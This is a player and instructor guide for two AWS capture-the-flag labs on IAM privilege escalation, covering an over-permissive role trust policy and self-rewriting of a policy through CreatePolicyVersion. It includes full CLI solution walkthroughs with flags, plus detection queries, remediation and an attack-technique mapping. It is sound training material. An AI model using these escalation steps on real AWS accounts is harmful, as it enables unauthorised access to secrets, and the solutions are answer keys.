# AWS CTF Labs — Player & Instructor Guide

> **Environment**: AWS (`sa-east-1`) · **Entry point**: IAM credentials · **Flag format**: `CYBERWARGAMES{...}`

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Lab 1 — Open Sesame (Easy)](#lab-1--open-sesame-easy)
4. [Lab 2 — The Lazy DevOps (Hard)](#lab-2--the-lazy-devops-hard)
5. [Solutions](#solutions) ← spoilers
6. [Post-CTF Exploration](#post-ctf-exploration) ← deep dive after solving
7. [Concepts Reference](#concepts-reference)

---

## Overview

Both labs are deployed in a single shared AWS account and focus on **IAM privilege escalation** — a class of vulnerability found frequently in real-world cloud environments. You start each lab with a pair of AWS IAM credentials that represent a low-privilege identity. Your goal is to exploit a misconfiguration in the environment to escalate your privileges and retrieve the flag.

| # | Name | Difficulty | Misconfiguration | Flag storage |
|---|------|-----------|-----------------|--------------|
| 1 | Open Sesame | Easy | Overly permissive IAM role trust policy | SSM Parameter Store |
| 2 | The Lazy DevOps | Hard | `iam:CreatePolicyVersion` on self-owned policy | Secrets Manager |

---

## Prerequisites

### AWS CLI

Install the AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

### Configure your profile

You will receive an `access_key_id` and `secret_access_key` for your lab. Configure a named profile so you don't interfere with any existing credentials:

```bash
aws configure --profile ctf-easy
# or
aws configure --profile ctf-hard
```

Enter the provided values when prompted. Set region to `sa-east-1` and output format to `json`.

Use the `--profile` flag on every command, or export the environment variables:

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=sa-east-1
```

### Verify your identity

Always start by confirming who you are:

```bash
aws sts get-caller-identity
```

You should see your lab username in the `Arn` field.

---

## Lab 1 — Open Sesame (Easy)

### Background

A junior developer on the platform team was tasked with setting up an IAM role for a new EC2 monitoring tool. The role needed to be assumable by EC2 instances so the tool could collect metrics. In a rush to meet a deadline, they configured the trust policy incorrectly.

The flag is encrypted and stored in AWS Systems Manager Parameter Store. Only the monitoring role has permission to read it — but something about the role's configuration might make it more accessible than intended.

### Objective

Retrieve the flag from `/ctf/easy/flag` in SSM Parameter Store.

### Your starting permissions

Your IAM user (`ctf-easy-player`) is attached a policy that grants:

| Permission | Scope |
|-----------|-------|
| `sts:GetCallerIdentity` | `*` |
| `iam:ListRoles` | `*` |
| `iam:GetRole` | `*` |
| `sts:AssumeRole` | One specific role ARN |
| `ssm:DescribeParameters` | `*` |

You cannot read from SSM Parameter Store directly with these credentials.

### Key questions to guide you

- What IAM roles exist in the account?
- Who or what is allowed to assume the monitoring role? Read the `AssumeRolePolicyDocument` carefully.
- Is the trust policy correct for its stated purpose?
- Once you assume the role, what can you do?

### Hints

<details>
<summary>Hint 1 — Finding the target</summary>

List all roles in the account and look for one that sounds related to monitoring or EC2:

```bash
aws iam list-roles --query 'Roles[*].[RoleName, Arn]' --output table
```

</details>

<details>
<summary>Hint 2 — Reading the trust policy</summary>

Inspect the role's trust relationship:

```bash
aws iam get-role --role-name <role-name> \
  --query 'Role.AssumeRolePolicyDocument'
```

Pay close attention to the `Principal`. What does `arn:aws:iam::ACCOUNT_ID:root` mean?

</details>

<details>
<summary>Hint 3 — Assuming the role</summary>

If the trust policy allows your identity to assume the role, use STS:

```bash
aws sts assume-role \
  --role-arn <role-arn> \
  --role-session-name my-session
```

The response contains temporary credentials. Export them as environment variables, then try reading the flag.

</details>

### Concepts practised

- IAM role trust policies and the difference between **service principals** (`ec2.amazonaws.com`) and **account principals** (`arn:aws:iam::ACCOUNT:root`)
- `sts:AssumeRole` and temporary security credentials
- SSM Parameter Store SecureString parameters

---

## Lab 2 — The Lazy DevOps (Hard)

### Background

A DevOps team built an automated CI/CD pipeline to deploy internal services. The pipeline runs as an IAM user (`ci-deploy-bot`) and needs its permissions updated occasionally as the deployment process evolves.

Rather than updating permissions through a proper change management process, the engineer attached a customer-managed IAM policy to the bot and gave it the ability to update that policy itself — a "self-managed permissions" approach they thought would save time.

Somewhere in the account there is also an S3 bucket the team used during setup. It might contain something useful.

The flag is stored as a secret in AWS Secrets Manager. It is not directly readable with your starting credentials.

### Objective

Retrieve the flag from `ctf/hard/flag` in AWS Secrets Manager.

### Your starting permissions

Your IAM user (`ctf-hard-player`) has two policies attached:

**Inline policy** — granted directly on your user:

| Permission | Scope |
|-----------|-------|
| `sts:GetCallerIdentity` | `*` |
| `iam:GetUser` | `*` |
| `iam:ListAttachedUserPolicies` | `*` |
| `iam:ListUserPolicies` | `*` |
| `iam:GetUserPolicy` | `*` |
| `iam:ListPolicies` | `*` |
| `iam:GetPolicy` | `*` |
| `iam:GetPolicyVersion` | `*` |
| `iam:ListPolicyVersions` | `*` |
| `iam:CreatePolicyVersion` | One specific policy ARN |
| `iam:SetDefaultPolicyVersion` | One specific policy ARN |
| `s3:ListAllMyBuckets` | `*` |
| `s3:ListBucket` / `s3:GetObject` | One specific S3 bucket |

**Managed policy** (`ctf-hard-restricted`) — attached to your user, initially very limited.

You cannot read from Secrets Manager with your starting credentials.

### Key questions to guide you

- What managed policies are attached to your user? Read them carefully.
- What does your inline policy allow you to do to that managed policy?
- What is the relationship between `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion`?
- Is there anything in S3 that provides context?
- After you update the managed policy, what happens to your effective permissions?

### Hints

<details>
<summary>Hint 1 — Enumerate yourself</summary>

Start by understanding exactly what permissions you have:

```bash
# See what managed policies are attached
aws iam list-attached-user-policies --user-name ctf-hard-player

# See what inline policies exist
aws iam list-user-policies --user-name ctf-hard-player

# Read the inline policy
aws iam get-user-policy \
  --user-name ctf-hard-player \
  --policy-name ctf-hard-inline
```

</details>

<details>
<summary>Hint 2 — Check S3</summary>

List all buckets you can see and look for something interesting:

```bash
aws s3 ls
aws s3 cp s3://<bucket-name>/hints/README.txt -
```

</details>

<details>
<summary>Hint 3 — Understanding IAM policy versions</summary>

AWS customer-managed policies support up to 5 versions. You can create a new version and set it as the default, effectively replacing the policy's permissions. If you have `iam:CreatePolicyVersion` on a policy, you can rewrite what it allows.

```bash
aws iam create-policy-version \
  --policy-arn <policy-arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[...]}' \
  --set-as-default
```

</details>

<details>
<summary>Hint 4 — What to put in the new policy version</summary>

Think about what service stores the flag and what action you need to read it. Then write a policy statement that grants exactly that action. After setting the new version as default, try reading the secret.

</details>

### Concepts practised

- Customer-managed IAM policy versioning
- `iam:CreatePolicyVersion` as a privilege escalation primitive
- IAM **permissions boundaries** — why your escalated permissions are still bounded
- AWS Secrets Manager

---

## Solutions

> ⚠️ **Stop here if you haven't attempted the labs yet.**

---

### Solution — Lab 1: Open Sesame

#### Step 1: Confirm your identity

```bash
aws sts get-caller-identity
```

Expected output:
```json
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/ctf-easy-player"
}
```

#### Step 2: Enumerate IAM roles

```bash
aws iam list-roles --query 'Roles[*].[RoleName, Arn]' --output table
```

You will see `ec2-monitoring-role` in the list.

#### Step 3: Read the trust policy

```bash
aws iam get-role --role-name ec2-monitoring-role \
  --query 'Role.AssumeRolePolicyDocument'
```

Output:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::123456789012:root"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

**The vulnerability**: the principal `arn:aws:iam::ACCOUNT_ID:root` means _any authenticated IAM identity in this account_ can assume this role — not just the EC2 service. The role was intended for EC2 instances, so the principal should have been `{ "Service": "ec2.amazonaws.com" }`.

#### Step 4: Assume the role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/ec2-monitoring-role \
  --role-session-name open-sesame
```

Output:
```json
{
    "Credentials": {
        "AccessKeyId": "ASIA...",
        "SecretAccessKey": "...",
        "SessionToken": "...",
        "Expiration": "..."
    }
}
```

Export the temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

#### Step 5: Read the flag

```bash
aws ssm get-parameter \
  --name /ctf/easy/flag \
  --with-decryption \
  --query 'Parameter.Value'
```

```
"CYBERWARGAMES{tr4ck_y0ur_trust_p0l1c135_c4r3fully}"
```

#### Why this works

IAM role trust policies define _who_ can assume a role (`sts:AssumeRole`). Using the account root (`arn:aws:iam::ACCOUNT:root`) as principal grants the permission to any identity in the account that also has `sts:AssumeRole` on the role ARN — in this case the player's starting policy includes exactly that. A correctly configured role for EC2 use would use `ec2.amazonaws.com` as the service principal, which cannot be impersonated by an IAM user.

---

### Solution — Lab 2: The Lazy DevOps

#### Step 1: Confirm your identity

```bash
aws sts get-caller-identity
```

#### Step 2: Enumerate your policies

```bash
# Managed policies attached to your user
aws iam list-attached-user-policies --user-name ctf-hard-player

# Inline policies
aws iam list-user-policies --user-name ctf-hard-player
```

You will see:
- Managed policy: `ctf-hard-restricted`
- Inline policy: `ctf-hard-inline`

#### Step 3: Read your managed policy

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/ctf-hard-restricted \
  --version-id v1
```

Output:
```json
{
    "Statement": [
        {
            "Effect": "Allow",
            "Action": ["sts:GetCallerIdentity"],
            "Resource": "*"
        }
    ]
}
```

Very limited — only identity checks.

#### Step 4: Read your inline policy

```bash
aws iam get-user-policy \
  --user-name ctf-hard-player \
  --policy-name ctf-hard-inline
```

Inspect the `PolicyDocument`. You will find:

```json
{
    "Sid": "SelfManagedPolicyUpdate",
    "Effect": "Allow",
    "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion"
    ],
    "Resource": "arn:aws:iam::123456789012:policy/ctf-hard-restricted"
}
```

**The vulnerability**: you can create new versions of `ctf-hard-restricted` and set them as the default — effectively rewriting your own managed policy's permissions.

#### Step 5: Find the S3 hint (optional breadcrumb)

```bash
aws s3 ls
```

You will see a bucket named `ctf-hard-artifacts-XXXXXXXX`. Download the hint:

```bash
aws s3 cp s3://ctf-hard-artifacts-XXXXXXXX/hints/README.txt -
```

```
Internal note — DevOps team

The ci-deploy bot has been set up with self-managed policy versioning
to allow automated permission updates during deployments.

Policy ARN: arn:aws:iam::123456789012:policy/ctf-hard-restricted

If you're reading this, you're either the team or... you shouldn't be here.
Good luck either way.
```

This confirms the policy ARN and the intent behind the misconfiguration.

#### Step 6: Escalate — create a new policy version

Create a new version of `ctf-hard-restricted` that grants Secrets Manager access:

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/ctf-hard-restricted \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "secretsmanager:*",
        "Resource": "*"
      }
    ]
  }' \
  --set-as-default
```

The new version (v2) is now the default. Your managed policy now grants `secretsmanager:*`.

#### Step 7: Read the flag

```bash
aws secretsmanager get-secret-value \
  --secret-id ctf/hard/flag \
  --query 'SecretString'
```

```
"CYBERWARGAMES{1am_cr3at3_p0l1cy_v3rs10n_pr1v3sc}"
```

#### Why this works — and why it's contained

**The escalation**: AWS allows up to 5 versions of a customer-managed policy. `iam:CreatePolicyVersion` with `--set-as-default` replaces the active policy document. If you hold this permission on a policy that is attached to yourself, you can inject any permissions you want into it — a well-known IAM privilege escalation primitive documented in the wild.

**Why you can't go further**: your user has a **permissions boundary** (`ctf-hard-player-boundary`) applied at creation. A permissions boundary defines the _maximum_ effective permissions an identity can ever have:

```
Effective permissions = Identity policies ∩ Permissions boundary
```

Even though your new managed policy says `"Action":"*"`, the boundary caps what actually goes through. The boundary was designed to allow exactly `secretsmanager:GetSecretValue` on the flag secret — which is why the escalation produces a meaningful result — but nothing beyond that. You cannot read other accounts' flags, modify other IAM users, or tamper with infrastructure.

This is also the correct **defence** against this attack: apply permissions boundaries to all IAM identities so that even if credentials or policies are compromised, the blast radius is bounded.

---

## Post-CTF Exploration

> This section is intended for **after** both labs are solved. It walks through the deployed infrastructure from the outside in — Terraform code, live AWS resources, detection techniques, and correct remediations — to bridge the gap between "I captured the flag" and "I understand this in production."

---

### 1. Reading the Terraform Code

The entire infrastructure lives in `terraform/`. Understanding it from the IaC perspective shows exactly what was deployed and, crucially, which lines contain the intentional misconfigurations.

#### Directory map

```
terraform/
├── providers.tf              # AWS provider, region sa-east-1, default tags
├── variables.tf              # Flag values (sensitive)
├── main.tf                   # Calls both modules, passes account_id
├── outputs.tf                # Sensitive outputs: credentials for both players
└── modules/
    ├── lab-easy/
    │   ├── variables.tf      # account_id, flag
    │   ├── main.tf           # All easy lab resources
    │   └── outputs.tf        # access_key_id, secret_access_key
    └── lab-hard/
        ├── variables.tf      # account_id, flag
        ├── main.tf           # All hard lab resources
        └── outputs.tf        # access_key_id, secret_access_key, hint_bucket
```

#### Finding the misconfigurations in code

**Lab 1** — open `terraform/modules/lab-easy/main.tf` and search for `INTENTIONAL MISCONFIGURATION`:

```hcl
# INTENTIONAL MISCONFIGURATION:
# Principal should be { Service = "ec2.amazonaws.com" }.
# Using the account root allows ANY authenticated IAM entity in the account
# to call sts:AssumeRole on this role — not just the EC2 service.
assume_role_policy = jsonencode({
  Statement = [{
    Principal = {
      AWS = "arn:aws:iam::${var.account_id}:root"   # ← the bug
    }
    Action = "sts:AssumeRole"
  }]
})
```

**Lab 2** — open `terraform/modules/lab-hard/main.tf` and search for `INTENTIONAL MISCONFIGURATION`:

```hcl
# INTENTIONAL MISCONFIGURATION:
# Grants the player the ability to create new versions of their own
# managed policy and set them as default — a well-known IAM privesc
# primitive.
Action = [
  "iam:CreatePolicyVersion",       # ← can rewrite the policy document
  "iam:SetDefaultPolicyVersion",   # ← can activate the new version
]
Resource = aws_iam_policy.restricted.arn  # ← the same policy attached to themselves
```

Also notice the permissions boundary in `lab-hard/main.tf` — the `aws_iam_user` resource has `permissions_boundary = aws_iam_policy.player_boundary.arn`. This single line is the entire safety net for the shared environment.

---

### 2. Exploring Live Resources — Lab 1 (Easy)

Use an administrator profile (or the `ctf-easy-player` credentials) to walk through every resource that was created.

#### The player user

```bash
aws iam get-user --user-name ctf-easy-player
```

Note the `Arn` and the absence of a `PermissionsBoundary` field — the easy lab user has no boundary (it doesn't need one; the role is already scoped).

List what policies are attached:

```bash
aws iam list-attached-user-policies --user-name ctf-easy-player
```

Read the policy document:

```bash
# Get the policy ARN from the previous command, then:
aws iam get-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-easy-player-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document'
```

Observe: `sts:AssumeRole` is scoped to one specific role ARN. The player cannot assume anything else.

#### The misconfigured role

```bash
aws iam get-role --role-name ec2-monitoring-role
```

In the `AssumeRolePolicyDocument`, compare the actual principal to what it should be:

| Field | Actual (misconfigured) | Correct |
|-------|----------------------|---------|
| `Principal` | `"AWS": "arn:aws:iam::ACCOUNT:root"` | `"Service": "ec2.amazonaws.com"` |
| Who can assume | Any IAM identity in the account | Only EC2 instances via instance profiles |

Read the role's permission policies:

```bash
aws iam list-role-policies --role-name ec2-monitoring-role

aws iam get-role-policy \
  --role-name ec2-monitoring-role \
  --policy-name ssm-read-flag \
  --query 'PolicyDocument'
```

Observe: the role's actions are tightly scoped to `ssm:GetParameter` / `ssm:GetParameters` on `arn:aws:ssm:sa-east-1:ACCOUNT:parameter/ctf/easy/*`. Even after assuming the role, the player cannot read Secrets Manager, modify IAM, or access any other resource.

#### The flag parameter

```bash
aws ssm describe-parameters \
  --parameter-filters "Key=Name,Values=/ctf/easy/flag"
```

Note the `Type: SecureString` — the value is encrypted with the AWS-managed KMS key for SSM. You need `ssm:GetParameter` with `--with-decryption` to read the plaintext, and only the role has that.

---

### 3. Exploring Live Resources — Lab 2 (Hard)

Use an administrator profile or the `ctf-hard-player` credentials (post-escalation).

#### The permissions boundary

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-player-boundary \
  --query 'Policy'
```

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-player-boundary \
  --version-id v1 \
  --query 'PolicyVersion.Document'
```

Walk through each statement and notice how each permission is precisely scoped:
- `PolicyVersionManagement` → only on `ctf-hard-restricted`, not `*`
- `S3HintBucket` → only on the specific bucket ARN
- `SecretsManagerFlag` → only on `arn:aws:secretsmanager:sa-east-1:ACCOUNT:secret:ctf/hard/flag*`

This is what prevented the escalation from becoming a full account compromise.

#### The player user and its boundary

```bash
aws iam get-user --user-name ctf-hard-player
```

The response includes:

```json
{
    "User": {
        "UserName": "ctf-hard-player",
        "PermissionsBoundary": {
            "PermissionsBoundaryType": "Policy",
            "PermissionsBoundaryArn": "arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-player-boundary"
        }
    }
}
```

The `PermissionsBoundary` field shows the boundary is enforced at the identity level.

#### Policy version history — before and after the attack

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted
```

After the CTF has been played through, you will see two versions:

```json
{
    "Versions": [
        { "VersionId": "v2", "IsDefaultVersion": true  },
        { "VersionId": "v1", "IsDefaultVersion": false }
    ]
}
```

Compare them side by side:

```bash
# Original (v1) — only sts:GetCallerIdentity
aws iam get-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted \
  --version-id v1 \
  --query 'PolicyVersion.Document'

# Escalated (v2) — whatever the player injected
aws iam get-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted \
  --version-id v2 \
  --query 'PolicyVersion.Document'
```

This diff is exactly what you would look for in a CloudTrail investigation after a real incident.

#### The S3 hint bucket

```bash
# List the bucket contents
aws s3 ls s3://ctf-hard-artifacts-XXXXXXXX --recursive

# Verify the bucket is private
aws s3api get-bucket-public-access-block \
  --bucket ctf-hard-artifacts-XXXXXXXX
```

All four public access block settings should be `true`. The hint file was only reachable because the player's policy explicitly granted `s3:GetObject` on that bucket — the file was never publicly accessible.

#### The Secrets Manager secret

```bash
aws secretsmanager describe-secret --secret-id ctf/hard/flag
```

Note:
- `KmsKeyId` is absent → the secret is encrypted with the AWS-managed key for Secrets Manager (`aws/secretsmanager`)
- `DeletedDate` is absent → the secret is active
- No resource-based policy is attached → access is controlled entirely by IAM identity policies and the permissions boundary

---

### 4. The Auto-Reset Mechanism (Hard Lab)

#### Why it exists

`iam:CreatePolicyVersion` modifies **shared AWS state**. Once Player 1 escalates `ctf-hard-restricted` to v2 and sets it as default, that change persists in the account. Without a reset, every subsequent player would arrive with an already-escalated policy and could read the flag directly — the learning objective would be completely bypassed.

#### How it works

A Lambda function (`ctf-hard-policy-reset`) is triggered by an EventBridge rule every **5 minutes**. The function:

1. Lists all versions of `ctf-hard-restricted`
2. If only v1 exists with the original content — does nothing
3. Otherwise:
   - Deletes all non-default versions (the ones the player injected)
   - Creates a fresh version with the original content and sets it as default
   - Deletes the old (escalated) default version

The reset is idempotent and handles the IAM 5-version limit gracefully.

#### Observing the reset in CloudWatch Logs

```bash
# Stream the Lambda logs live
aws logs tail /aws/lambda/ctf-hard-policy-reset --follow

# See the last 10 invocations
aws logs filter-log-events \
  --log-group-name /aws/lambda/ctf-hard-policy-reset \
  --limit 10 \
  --query 'events[*].message'
```

After Player 1 escalates, you will see entries like:

```
Deleted non-default version v1
Created fresh version with original content and set as default
Deleted old default version v2
```

#### Policy version state over time

```
T+00:00  Player 1 arrives        → ctf-hard-restricted: [v1* (original)]
T+02:00  Player 1 escalates      → ctf-hard-restricted: [v1,  v2* (secretsmanager:*)]
T+03:00  Player 1 reads the flag → flag captured
T+05:00  Lambda fires            → ctf-hard-restricted: [v3* (original)]  ← reset
T+05:01  Player 2 arrives        → must escalate again to read the flag
```

(v3 is functionally identical to v1 — the version number increments but the content is the same.)

#### What the Lambda cannot do

The Lambda execution role is narrowly scoped: `iam:ListPolicyVersions`, `iam:GetPolicyVersion`, `iam:CreatePolicyVersion`, `iam:DeletePolicyVersion` — all on `ctf-hard-restricted` only. It cannot touch any other resource, read the flag, or modify the player user or boundary.

---

### 6. Using the IAM Policy Simulator

The IAM Policy Simulator lets you test what an identity can and cannot do without actually making the call. It is invaluable for auditing.

Open the console simulator:
```
https://policysim.aws.amazon.com/
```

Or use the CLI:

```bash
# Test whether ctf-easy-player can read the easy flag directly (should DENY)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/ctf-easy-player \
  --action-names ssm:GetParameter \
  --resource-arns arn:aws:ssm:sa-east-1:ACCOUNT_ID:parameter/ctf/easy/flag

# Test whether ctf-easy-player can assume the monitoring role (should ALLOW)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/ctf-easy-player \
  --action-names sts:AssumeRole \
  --resource-arns arn:aws:iam::ACCOUNT_ID:role/ec2-monitoring-role

# Test whether ctf-hard-player can read Secrets Manager before escalation (should DENY)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/ctf-hard-player \
  --action-names secretsmanager:GetSecretValue \
  --resource-arns arn:aws:secretsmanager:sa-east-1:ACCOUNT_ID:secret:ctf/hard/flag-XXXXXX
```

The simulator respects permissions boundaries — you will see a `DENIED` result annotated with `PermissionsBoundary` as the denial reason when the boundary is the blocking layer.

---

### 7. Detecting These Attacks in a Real Environment

#### CloudTrail — the evidence trail

Every AWS API call is logged in CloudTrail. These are the events to monitor for each attack:

**Lab 1 pattern — unexpected role assumption:**

```
eventName: AssumeRole
requestParameters.roleArn: arn:aws:iam::ACCOUNT:role/ec2-monitoring-role
userIdentity.type: IAMUser          ← suspicious: should be AssumedRole from EC2
userIdentity.arn: arn:.../:user/... ← an IAM user is assuming an EC2 role
```

Alert condition: `AssumeRole` events where the calling identity is an IAM user (or any non-EC2 principal) assuming a role that has `ec2.amazonaws.com` in the role name or description.

**Lab 2 pattern — policy version manipulation:**

```
eventName: CreatePolicyVersion
requestParameters.policyArn: arn:aws:iam::ACCOUNT:policy/ctf-hard-restricted
requestParameters.setAsDefault: true
```

```
eventName: SetDefaultPolicyVersion
requestParameters.policyArn: ...
requestParameters.versionId: v2
```

Alert condition: any `CreatePolicyVersion` or `SetDefaultPolicyVersion` event where the caller is also the principal attached to that policy. This pattern — identity modifying its own policy — should always be treated as high-severity.

#### Query CloudTrail with Athena (production approach)

If CloudTrail is configured to send to S3 and Athena is enabled, you can query the logs directly:

```sql
-- Find all AssumeRole calls by IAM users in the last 7 days
SELECT
  eventtime,
  useridentity.arn AS caller,
  requestparameters
FROM cloudtrail_logs
WHERE eventname = 'AssumeRole'
  AND useridentity.type = 'IAMUser'
  AND eventtime > DATE_ADD('day', -7, NOW())
ORDER BY eventtime DESC;

-- Find policy version changes
SELECT
  eventtime,
  useridentity.arn AS caller,
  eventname,
  requestparameters
FROM cloudtrail_logs
WHERE eventname IN ('CreatePolicyVersion', 'SetDefaultPolicyVersion')
ORDER BY eventtime DESC;
```

#### AWS IAM Access Analyzer

IAM Access Analyzer automatically flags resources that are accessible from outside the account or that violate a defined zone of trust. Enable it at the organization level to catch trust policy misconfigurations like Lab 1.

```bash
# Enable Access Analyzer for the account
aws accessanalyzer create-analyzer \
  --analyzer-name ctf-account-analyzer \
  --type ACCOUNT

# List findings (may take a few minutes after enabling)
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:access-analyzer:sa-east-1:ACCOUNT_ID:analyzer/ctf-account-analyzer
```

Access Analyzer will not flag the Lab 1 misconfiguration as *external* access (since the trust allows account root, not external), but it will flag any role accessible from outside the account.

For internal access analysis, use **IAM Access Analyzer with custom policy checks**:

```bash
# Check a policy document for known privilege escalation paths
aws accessanalyzer check-no-new-access \
  --new-policy-document file://new-policy.json \
  --existing-policy-document file://existing-policy.json \
  --policy-type IDENTITY_POLICY
```

#### Prowler — automated CIS/AWS benchmark scanning

[Prowler](https://github.com/prowler-cloud/prowler) is an open-source tool that runs hundreds of AWS security checks. Two checks are directly relevant:

```bash
# Install
pip install prowler

# Run checks relevant to these labs
prowler aws --checks \
  iam_role_cross_account_readonlyaccess_policy \
  iam_policy_allows_privilege_escalation \
  iam_no_root_access_key \
  --region sa-east-1
```

The `iam_policy_allows_privilege_escalation` check specifically tests for `iam:CreatePolicyVersion` and other escalation actions in policies.

---

### 8. Remediation — Fixing the Misconfigurations

#### Lab 1 fix — correct the trust policy

**Vulnerable:**
```json
{
  "Effect": "Allow",
  "Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" },
  "Action": "sts:AssumeRole"
}
```

**Fixed:**
```json
{
  "Effect": "Allow",
  "Principal": { "Service": "ec2.amazonaws.com" },
  "Action": "sts:AssumeRole"
}
```

In Terraform (`modules/lab-easy/main.tf`), change the `assume_role_policy`:

```hcl
assume_role_policy = jsonencode({
  Version = "2012-10-17"
  Statement = [{
    Effect    = "Allow"
    Principal = { Service = "ec2.amazonaws.com" }  # ← fixed
    Action    = "sts:AssumeRole"
  }]
})
```

**Defence in depth**: if the role must be assumable by users in some contexts, add an explicit condition:

```json
{
  "Effect": "Allow",
  "Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" },
  "Action": "sts:AssumeRole",
  "Condition": {
    "StringEquals": {
      "aws:PrincipalArn": "arn:aws:iam::ACCOUNT_ID:role/only-this-specific-role"
    }
  }
}
```

#### Lab 2 fix — remove self-referential policy write permissions

**Option A — Remove the dangerous actions entirely**

Strip `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` from the inline policy. If the pipeline genuinely needs to update its own permissions, that update should go through a separate privileged pipeline identity that is not attached to the policy being modified.

**Option B — Add a deny condition using `aws:PrincipalArn`**

If you cannot easily remove the actions, add a Deny statement that blocks the identity from modifying its own policy:

```json
{
  "Effect": "Deny",
  "Action": [
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion",
    "iam:PutUserPolicy",
    "iam:AttachUserPolicy"
  ],
  "Resource": "*",
  "Condition": {
    "ArnLike": {
      "aws:PrincipalArn": "arn:aws:iam::ACCOUNT_ID:user/ci-deploy-bot"
    }
  }
}
```

**Option C — Use an SCP (recommended for organizations)**

A Service Control Policy applied at the Organization or OU level can globally prevent any identity from modifying IAM policies attached to itself:

```json
{
  "Effect": "Deny",
  "Action": [
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion"
  ],
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "aws:PrincipalTag/ManagedByPipeline": "true"
    }
  }
}
```

**Option D — Apply a permissions boundary (the approach used in this lab)**

Attach a permissions boundary to every pipeline identity that caps the maximum effective permissions to only what the pipeline legitimately needs. Even if `CreatePolicyVersion` is exploited, the boundary prevents any escalation beyond the defined ceiling.

---

### 9. MITRE ATT&CK Mapping

Both labs map to the MITRE ATT&CK Cloud matrix:

| Lab | Tactic | Technique | Sub-technique |
|-----|--------|-----------|---------------|
| 1 | Privilege Escalation (TA0004) | Valid Accounts (T1078) | Cloud Accounts (T1078.004) |
| 1 | Lateral Movement (TA0008) | Use Alternate Authentication Material (T1550) | — |
| 2 | Privilege Escalation (TA0004) | Abuse Elevation Control Mechanism (T1548) | — |
| 2 | Credential Access (TA0006) | Steal Application Access Token (T1528) | — |

The `iam:CreatePolicyVersion` technique is also catalogued in the [Rhino Security Labs AWS IAM Privilege Escalation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) research (method #1 in their list of 21 escalation paths).

---

### 10. Further Reading and Tools

| Resource | What it covers |
|----------|---------------|
| [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html) | Official guidance on least privilege, boundaries, MFA |
| [Rhino Security Labs — AWS Privilege Escalation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) | 21 documented IAM escalation paths including `CreatePolicyVersion` |
| [CloudSploit / Aqua](https://github.com/aquasecurity/cloudsploit) | Open-source AWS misconfiguration scanner |
| [Prowler](https://github.com/prowler-cloud/prowler) | 300+ AWS/GCP/Azure security checks |
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) | AWS exploitation framework for red teams |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud security auditing tool |
| [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html) | Native AWS tool for policy analysis and unused access |
| [AWS CloudTrail Lake](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-lake.html) | SQL queries over CloudTrail events for threat hunting |
| [Permission boundaries — AWS docs](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html) | Deep dive on how boundaries interact with identity policies |

---

### IAM Role Trust Policies

Every IAM role has two components:

1. **Trust policy** — defines *who* can assume the role (`sts:AssumeRole`)
2. **Permission policy** — defines *what* the role can do once assumed

```
Principal types in trust policies:
  Service  → "Principal": { "Service": "ec2.amazonaws.com" }
             Only the EC2 service can assume this role (for instance profiles)

  AWS      → "Principal": { "AWS": "arn:aws:iam::ACCOUNT:root" }
             Any authenticated entity in the account can assume this role
             (if they also have sts:AssumeRole on the role ARN)

  Federated → external identity providers (OIDC, SAML)
```

Common misconfiguration: using `AWS: arn:aws:iam::ACCOUNT:root` when you intended `Service: ec2.amazonaws.com`.

---

### IAM Customer-Managed Policy Versions

AWS supports up to **5 versions** of a customer-managed policy. Only one version is active (the default) at a time.

```
Policy: ctf-hard-restricted
  ├── v1 (created by Terraform) — only sts:GetCallerIdentity  [default]
  └── v2 (created by player)    — secretsmanager:*            [new default]
```

Privilege escalation path when you have `iam:CreatePolicyVersion` on a policy attached to yourself:

```
